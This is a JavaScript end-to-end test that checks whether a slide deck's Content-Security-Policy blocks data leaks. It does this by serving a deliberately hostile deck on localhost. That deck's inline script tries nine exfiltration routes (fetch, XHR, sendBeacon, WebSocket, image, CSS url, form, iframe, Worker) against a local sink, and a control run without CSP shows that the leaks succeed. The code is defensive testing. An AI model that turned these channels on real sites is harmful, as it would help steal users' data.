/* 배포 Worker의 덱 CSP를 실제 브라우저에서 본다(spec/WORKER-CSP.md 합격 3, 4). 원격 호출 없음.
   로컬 서버(deploy/csp-serve.ts)가 실제 Worker 코드(handle)와 가짜 KV로 번들을 127.0.0.1에서 서빙한다.
   1) 워크숍 덱과 안내 덱의 실제 번들: 슬라이드가 정상 동작(이동, 전체 보기, 인라인 스크립트 실행)하고 CSP 위반이 0건
   2) 유출을 시도하는 덱: 인라인 스크립트는 돌지만 fetch, XHR, sendBeacon, WebSocket, Image, 폼, iframe, Worker 시도는 모두 막혀 수신구에 한 건도 안 닿는다
   3) 대조군: 같은 덱을 CSP 없이 서빙하면 유출이 실제로 일어난다(시험이 유효하다는 근거)
   Usage: PW=<playwright-core> CHROME=<headless shell> node deploy/csp-e2e.cjs */
const { launch } = require('../scripts/lib/pw.cjs');
const { makeTestDeck } = require('../scripts/lib/test-deck.cjs');
const fs = require('fs'), path = require('path'), cp = require('child_process');
const ROOT = path.join(__dirname, '..'), PORT = 3296, BASE = `http://127.0.0.1:${PORT}`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let fail = 0;
const check = (n, ok, x) => { if (!ok) fail++; console.log((ok ? 'PASS ' : 'FAIL ') + n + (ok || x === undefined ? '' : '  ' + JSON.stringify(x).slice(0, 500))); };
const until = async (fn, ms = 8000) => { const t = Date.now(); while (Date.now() - t < ms) { if (await fn().catch(() => false)) return true; await sleep(100); } return false; };

/* 유출 시도 덱: 인라인 스크립트가 돈다는 표시 뒤 밖으로 보내는 길을 모두 시도한다 */
const EVIL = `<!doctype html><html lang="en" data-slidekit="1"><head><meta charset="utf-8"><title>evil</title>
<script type="application/json" id="deck-meta">{ "title": "evil", "id": "csp-evil" }</script></head><body>
<section data-slide="cover"><h1>Evil</h1></section>
<script>
window.__ran = true; document.title = 'ran';
var L = '${BASE}/leak', tries = [];
var t = function (name, f) { try { f(); tries.push(name); } catch (e) { tries.push(name + ':throw'); } };
t('fetch', function () { fetch(L + '?fetch').catch(function () {}); });
t('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', L + '?xhr'); x.onerror = function () {}; x.send(); });
t('beacon', function () { navigator.sendBeacon(L + '?beacon', 'x'); });
t('ws', function () { var w = new WebSocket('ws://127.0.0.1:${PORT}/leak?ws'); w.onerror = function () {}; });
t('image', function () { new Image().src = L + '?image'; });
t('css', function () { var s = document.createElement('style'); s.textContent = 'body{background:url(${BASE}/leak?css)}'; document.head.appendChild(s); });
t('form', function () { var f = document.createElement('form'); f.action = L + '?form'; f.method = 'post'; document.body.appendChild(f); f.submit(); });
t('iframe', function () { var i = document.createElement('iframe'); i.src = L + '?iframe'; document.body.appendChild(i); });
t('worker', function () { new Worker(L + '?worker'); });
window.__tries = tries;
</script>
<script src="/engine/slidekit.js"></script></body></html>`;

(async () => {
  const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'sk-csp-'));
  const decks = { 'csp-work': makeTestDeck('csp-work'), 'csp-guide': makeTestDeck('csp-guide', 'guide') };
  const files = [];
  for (const [name, t] of Object.entries(decks)) {
    const r = cp.spawnSync('bun', [path.join(ROOT, 'app/server.ts'), 'bundle', t.folder], { cwd: ROOT, encoding: 'utf8' });
    const out = path.join(ROOT, 'dist', `${t.folder}.html`);
    if (!fs.existsSync(out)) { console.log('FAIL 번들 생성 ' + name + ' ' + (r.stderr || r.stdout).slice(-200)); fail++; continue; }
    files.push(`${name}=${out}`);
  }
  const evilFile = path.join(tmp, 'evil.html');
  fs.writeFileSync(evilFile, EVIL.replace('<script src="/engine/slidekit.js"></script>', `<script>${fs.readFileSync(path.join(ROOT, 'engine/slidekit.js'), 'utf8')}</script>`));
  files.push(`csp-evil=${evilFile}`);
  const srv = cp.spawn('bun', [path.join(__dirname, 'csp-serve.ts'), String(PORT), ...files], { cwd: ROOT, stdio: ['ignore', 'pipe', 'inherit'], detached: false });
  const cleanup = () => { try { srv.kill(); } catch {} fs.rmSync(tmp, { recursive: true, force: true }); for (const t of Object.values(decks)) { try { fs.rmSync(path.join(ROOT, 'dist', `${t.folder}.html`), { force: true }); t.cleanup(); } catch {} } };
  process.on('exit', cleanup);
  await new Promise((res) => { srv.stdout.on('data', (d) => /READY/.test(String(d)) && res()); setTimeout(res, 8000); });
  const hits = async () => (await fetch(`${BASE}/__hits`)).json();
  const reset = () => fetch(`${BASE}/__hits`, { method: 'DELETE' });
  const browser = await launch();
  try {
    /* 응답 헤더 */
    const r0 = await fetch(`${BASE}/csp-work`);
    const csp = r0.headers.get('content-security-policy') || '';
    check('실제 번들 응답에 CSP: 외부로 나가는 요청을 모두 막는다', ["connect-src 'none'", "form-action 'none'", "frame-src 'none'", "worker-src 'none'", "default-src 'none'"].every((d) => csp.includes(d)), csp);
    check('Permissions-Policy도 붙는다', (r0.headers.get('permissions-policy') || '').includes('camera=()'));

    /* 1) 실제 번들 둘 */
    for (const name of ['csp-work', 'csp-guide']) {
      const ctx = await browser.newContext({ viewport: { width: 1280, height: 720 } });
      await ctx.route(/fonts\.(googleapis|gstatic)\.com/, (r) => r.abort());
      const p = await ctx.newPage(), errs = [], cons = [];
      p.on('pageerror', (e) => errs.push(String(e)));
      p.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') cons.push(m.text()); });
      await p.addInitScript(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.violatedDirective + ' ' + e.blockedURI)); });
      await p.goto(`${BASE}/${name}`);
      check(`${name}: 번들이 뜨고 엔진이 시작한다`, await until(async () => (await p.locator('#sk-stage [data-active]').count()) === 1));
      const before = await p.evaluate(() => location.hash);
      await p.keyboard.press('ArrowRight'); await p.keyboard.press('ArrowRight'); await sleep(500);
      check(`${name}: 방향키로 슬라이드가 넘어간다`, (await p.evaluate(() => location.hash)) !== before);
      await p.keyboard.press('o'); await sleep(300);
      check(`${name}: 전체 보기(썸네일)가 열린다`, (await p.locator('.sk-thumb').count()) > 3);
      await p.keyboard.press('Escape'); await sleep(200);
      const v = await p.evaluate(() => window.__v);
      check(`${name}: CSP 위반 0건`, v.length === 0 && !cons.some((c) => /Content Security Policy/i.test(c)), [v.slice(0, 3), cons.filter((c) => /Content Security/i.test(c)).slice(0, 2)]);
      check(`${name}: 페이지 오류 없음`, errs.length === 0, errs.slice(0, 2));
      await ctx.close();
    }

    /* 2) 유출을 시도하는 덱 */
    await reset();
    {
      const ctx = await browser.newContext(), p = await ctx.newPage();
      await p.addInitScript(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.violatedDirective)); });
      await p.goto(`${BASE}/csp-evil`);
      check('유출 덱: 인라인 스크립트는 실행된다(덱이 동작해야 하므로)', await until(async () => (await p.evaluate(() => window.__ran)) === true));
      await sleep(1200);
      const v = await p.evaluate(() => window.__v), tries = await p.evaluate(() => window.__tries);
      check('유출 덱: 모든 시도가 실행되었다(막힌 것은 CSP이지 시도 실패가 아님)', Array.isArray(tries) && tries.length === 9 && !tries.some((x) => /throw/.test(x) && !/worker|ws/.test(x)), tries);
      for (const d of ['connect-src', 'img-src', 'form-action', 'frame-src', 'worker-src']) check(`유출 덱: ${d} 위반이 보고된다`, v.some((x) => x.startsWith(d)), v);
      const h = await hits();
      check('유출 덱: 수신구에 한 건도 안 닿았다', h.length === 0, h);
      await ctx.close();
    }
    /* 3) 대조군 */
    await reset();
    {
      const ctx = await browser.newContext(), p = await ctx.newPage();
      await p.goto(`${BASE}/off/csp-evil`);
      await until(async () => (await hits()).length >= 4, 6000);
      const h = await hits();
      check('대조군(CSP 없음): 같은 덱이 실제로 유출한다(시험이 유효하다는 근거)', h.length >= 4, h);
      await ctx.close();
    }
  } finally {
    await browser.close();
    cleanup();
  }
  console.log(fail ? `${fail} FAILED` : 'ALL PASS');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(2); });
